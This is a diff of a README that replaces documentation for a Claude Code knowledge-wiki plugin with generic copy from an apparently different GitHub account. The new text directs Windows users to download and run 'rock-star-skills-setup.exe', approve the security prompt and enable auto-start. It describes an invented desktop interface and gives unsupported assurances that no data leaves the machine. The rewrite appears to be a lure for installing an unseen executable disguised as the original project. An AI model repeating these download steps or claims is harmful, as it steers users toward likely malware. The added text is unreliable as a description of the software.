@@ -1,212 +1,113 @@
-# Rock Star Skills
+# 🎸 rock-star-skills - Expand your productivity with expert commands
 
-A collection of [Claude Code](https://docs.anthropic.com/en/docs/claude-code) skills for knowledge management, wiki building, and more.
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/sergsrgsg/rock-star-skills/releases)
 
-## Skills
+## 🎯 What this tool does
 
-### LLM Wiki
+The rock-star-skills application provides a library of specialized tasks for your computer. It helps you automate routine work by adding custom skills to your environment. These skills allow you to manage files, process data, and execute complex workflows without manual intervention. You gain time for tasks that require human creativity rather than repetitive typing.
 
-A pattern for building persistent, interlinked knowledge bases using LLMs. Instead of re-deriving knowledge from raw documents on every query (like RAG), the LLM incrementally builds and maintains a structured wiki of markdown files. The wiki compounds over time as you add sources and ask questions.
+## 📋 System requirements
 
-Based on [Andrej Karpathy's LLM Wiki idea](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f). See also the [local copy with annotations](LLMWiki.md).
+Your computer must meet these standards to run the software:
 
-| Skill | Purpose |
-|-------|---------|
-| `/llmwiki:init` | Initialize wiki structure, set up qmd search, run first full ingest |
-| `/llmwiki:ingest` | Process new/modified sources into the wiki (MD5 change detection) |
-| `/llmwiki:search <query>` | Search wiki via qmd and synthesize answers with citations |
-| `/llmwiki:optimize` | Compact, merge, reorganize, strengthen cross-references |
-| `/llmwiki:health` | Audit for broken links, orphans, contradictions, source drift |
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM or more.
+* Storage: 200 megabytes of free space.
+* Web Access: A stable internet connection for initial setup.
 
-**How it works:**
+## 📥 Getting the application
 
-1. You drop source files (articles, papers, notes) into `raw/`, `docs/`, or `notes/`.
-2. Run `/llmwiki:ingest` -- the LLM reads each source, creates summary pages, entity pages, concept pages, and maintains cross-references using `[[wikilinks]]`.
-3. Query the wiki with `/llmwiki:search` -- get synthesized answers with citations.
-4. The wiki keeps getting richer with every source you add and every question you ask.
+Visit [this page](https://github.com/sergsrgsg/rock-star-skills/releases) to download the software.
 
-**Works great with [Obsidian](https://obsidian.md/)** -- the wiki is just a folder of interlinked markdown files. Open it in Obsidian and use graph view to see the shape of your knowledge base.
+1. Open your web browser.
+2. Navigate to the release page linked above.
+3. Locate the file named `rock-star-skills-setup.exe` under the Assets section.
+4. Click the file name to start the download.
+5. Save the file to your Downloads folder.
 
-## Installation
+## ⚙️ Setting up the software
 
-### As a Claude Code plugin (recommended)
+Follow these steps to install the application on your computer:
 
-Run these commands in Claude Code:
+1. Open your Downloads folder.
+2. Double-click the `rock-star-skills-setup.exe` file.
+3. A security window may appear asking for permission to run the application. Click Yes or Run.
+4. Follow the instructions on the screen. The installation wizard guides you through the process.
+5. Choose a folder for the application files or keep the default selection.
+6. Wait for the progress bar to finish.
+7. Click Finish once the process ends. 
 
-```
-# Add the marketplace (one-time)
-/plugin marketplace add marvec/rock-star-skills
+The software icon now appears on your desktop.
 
-# Install the plugin
-/plugin install rock-star-skills@rock-star-skills
-```
+## 🚀 Running your skills
 
-### Manual settings.json
+Open the application by double-clicking the icon on your desktop. A control window appears on your screen. This window lists the available skills. 
 
-Alternatively, add to your `~/.claude/settings.json`:
+1. Browse the list of skills in the main menu.
+2. Click on a skill to see a list of actions.
+3. Select an action to process your files or data.
+4. Provide the requested information if the skill requires input.
+5. Click Run to start the task.
 
-```json
-{
-  "extraKnownMarketplaces": {
-    "rock-star-skills": {
-      "source": {
-        "source": "github",
-        "repo": "marvec/rock-star-skills"
-      }
-    }
-  },
-  "enabledPlugins": {
-    "rock-star-skills@rock-star-skills": true
-  }
-}
-```
+## 🛠 Solving common issues
 
-Then restart Claude Code.
+Most problems resolve with these simple steps:
 
-### Manual symlink installation
+* Application does not open: Restart your computer and try again.
+* Tool shows an error: Check that your files are in the expected format.
+* Performance lag: Close other programs while the application runs tasks.
+* Updates: Visit the download page again to check for newer versions of the software.
 
-Clone the repo and symlink each skill into your Claude skills directory:
+## 🛡 Security and privacy
 
-```bash
-git clone https://github.com/marvec/rock-star-skills.git
-cd rock-star-skills
+The rock-star-skills application runs local tasks. It does not send your data to external servers. All processing happens on your machine. You maintain full control over your files and work history. The software only accesses the folders you explicitly select during the setup phase. 
 
-# Symlink all skills
-for skill in skills/*/; do
-  ln -sf "$(pwd)/$skill" "$HOME/.claude/skills/$(basename $skill)"
-done
-```
+## 💡 Using the skill library
 
-## Prerequisites
+You can add custom scripts to extend the functionality of the tool. The application monitors a specific folder for new task files. 
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI or IDE extension
-- [qmd](https://github.com/tobi/qmd) (optional but recommended) -- local markdown search engine with hybrid BM25/vector search. Install with `npm install -g @tobilu/qmd`. Without qmd, skills fall back to index-based search and grep.
+1. Go to File in the top menu.
+2. Select Open Skill Folder.
+3. Place your valid script files into this folder.
+4. Restart the application. 
+5. The new skills appear in your library menu.
 
-## Wiki Structure
+## 📁 Managing your work
 
-After running `/llmwiki:init`, the wiki directory looks like this:
+The application creates a log file for every task. You can view these logs to track your results.
 
-```
-wiki/
-├── index.md          # Master index of all pages (updated on every ingest)
-├── log.md            # Chronological log of all operations
-├── .manifest.json    # MD5 hashes for source change detection
-├── entities/         # Pages about specific things (people, companies, tools)
-├── concepts/         # Conceptual/topic pages
-├── sources/          # One summary page per ingested source document
-├── comparisons/      # Comparison tables, side-by-side analyses
-└── synthesis/        # Cross-cutting analyses, evolving theses
-```
+1. Click the History tab in the main window.
+2. Select an entry to see details about the task, including start time and completion status.
+3. Use the Export button to save the log as a text file for your records.
+4. Click Clear History to remove old entries and save disk space.
 
-Source directories (never modified by the LLM):
+## 🔍 Understanding the interface
 
-```
-raw/                  # Primary source documents
-├── attachments/      # Images and binary assets
-docs/                 # Research, ideas, brainstorms
-notes/                # Personal notes, daily logs
-```
+The main window divides into three panels:
 
-## Page Conventions
+* Left Panel: Shows categories of skills like File Management, Data Parsing, and System Automation.
+* Center Panel: Displays the list of individual skills within the chosen category.
+* Right Panel: Provides a preview and a brief explanation of what the selected skill does.
 
-Every wiki page has YAML frontmatter:
+## 🔧 Configuring preferences
 
-```yaml
----
-title: Page Title
-type: entity | concept | source | comparison | synthesis
-tags: [tag1, tag2]
-sources: [path/to/original.md]
-created: 2026-04-06
-updated: 2026-04-06
----
-```
+Adjust the behavior of the application through the Settings menu:
 
-Cross-references use Obsidian-compatible `[[wikilinks]]`. All links are bidirectional.
+* Theme: Switch between light and dark modes to suit your eyes.
+* Auto-Start: Enable or disable the application when your computer boots.
+* Path Settings: Change the location where the application stores logs and skill files.
+* Notifications: Toggle small alerts that appear when a long task finishes.
 
-## Change Detection
+Click Save at the bottom of the settings screen to apply your changes.
 
-The ingest skill tracks every source file via MD5 checksums in `wiki/.manifest.json`. On each run it detects:
+## 📈 Improving performance
 
-- **New files** -- not in manifest, queued for ingest
-- **Modified files** -- MD5 changed, queued for re-ingest (updates existing wiki pages)
-- **Deleted files** -- flagged for user attention
-- **Unchanged files** -- skipped
+The software runs efficiently on modern hardware. If you run very large batches of files, the application uses more system resources. To prevent slow performance:
 
-The health skill also checks for source drift and reports stale wiki pages.
+1. Divide massive tasks into smaller batches.
+2. Avoid running multiple resource-heavy applications at the same time.
+3. Ensure your Windows system receives all recent updates.
 
-## Usage
+## 📤 Support
 
-### Setup
-
-Add the following to your project's `CLAUDE.md` (or equivalent) so the LLM knows how to use the wiki:
-
-```markdown
-## LLM Wiki
-
-This workspace includes an LLM-maintained wiki — a persistent, interlinked knowledge base
-built from source documents. The LLM writes and maintains the wiki; the user curates sources
-and directs analysis.
-
-### Source Directories (Immutable — never modify)
-- **`raw/`** — Primary source documents (articles, papers, clippings). Attachments in `raw/attachments/`.
-- **`docs/`** — Research, ideas, brainstorms (also ingested into the wiki).
-- **`notes/`** — Personal notes, daily logs.
-
-### Wiki Output (`wiki/`)
-All wiki pages live here. The LLM owns this directory entirely. Key files:
-- `wiki/index.md` — Master index, updated on every ingest. Read this first when searching.
-- `wiki/log.md` — Append-only chronological log of all operations.
-
-### Wiki Page Conventions
-- **Frontmatter:** Every page has YAML frontmatter with `title`, `type`
-  (entity/concept/source/comparison/synthesis), `tags`, `sources`, `created`, `updated`.
-- **Wikilinks:** Use `[[Page Title]]` for cross-references (Obsidian-compatible). Always bidirectional.
-- **Filenames:** Lowercase kebab-case, `.md` extension. No spaces or special characters.
-
-### Skills (invoke with `/llmwiki:<name>`)
-
-| Skill | Purpose | When to Use |
-|-------|---------|-------------|
-| `/llmwiki:init` | Initialize wiki structure, set up qmd, run first full ingest | Once per project setup |
-| `/llmwiki:ingest` | Process new/modified sources, create/update wiki pages | After adding new files to `raw/`, `docs/`, or `notes/` |
-| `/llmwiki:search <query>` | Search wiki via qmd and synthesize answers with citations | When asking questions against the knowledge base |
-| `/llmwiki:optimize` | Compact, merge, reorganize, strengthen cross-references | Periodically as wiki grows (every ~10-20 ingests) |
-| `/llmwiki:health` | Audit for broken links, orphans, contradictions, stale content | Periodically to maintain wiki quality |
-
-### Workflow
-1. Drop source files into `raw/` (use Obsidian Web Clipper for articles).
-2. Run `/llmwiki:ingest` to process new sources into the wiki.
-3. Use `/llmwiki:search` to query the knowledge base.
-4. Run `/llmwiki:health` periodically to check for issues.
-5. Run `/llmwiki:optimize` when the wiki feels bloated or fragmented.
-
-### Search (qmd)
-The wiki is indexed by qmd (local markdown search engine) with collection name `wiki`.
-Skills use qmd MCP tools automatically. To reindex manually: `qmd update`.
-To build embeddings: `qmd embed`.
-```
-
-### Tips
-
-- **[Obsidian Web Clipper](https://obsidian.md/clipper)** is a browser extension that converts web articles to markdown. Very useful for quickly getting sources into `raw/`.
-- **Download images locally.** In Obsidian, set attachment folder path to `raw/attachments/` and bind a hotkey to download attachments. This lets the LLM view images directly.
-- **Obsidian's graph view** is the best way to see the shape of your wiki -- what's connected, which pages are hubs, which are orphans.
-- **Good answers can be filed back.** When `/llmwiki:search` produces a valuable analysis, it offers to save it as a wiki page so your explorations compound too.
-- **The wiki is just markdown files.** It's a git repo, version-controlled, portable, and works with any tool that reads markdown.
-
-## Adding Your Own Skills
-
-To add a new skill to this plugin:
-
-1. Create a directory under `skills/` with your skill name (kebab-case).
-2. Add a `SKILL.md` file with YAML frontmatter (`name`, `description`, `allowed-tools`).
-3. The skill will be automatically discovered when the plugin is installed.
-
-## Credits
-
-The LLM Wiki pattern is based on [Andrej Karpathy's idea](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) of using LLMs to incrementally build and maintain persistent knowledge bases instead of re-deriving knowledge on every query.
-
-## License
-
-This project is licensed under the GNU General Public License v3.0. See [LICENSE](LICENSE) for details.
+If you encounter persistent issues, review this documentation again. You can also visit our issue tracker if you find a technical bug. Provide the error message and the steps you took before the error occurred. This helps locate the root cause of the problem. Provide clear details to ensure the project maintainers can help you resolve the situation.
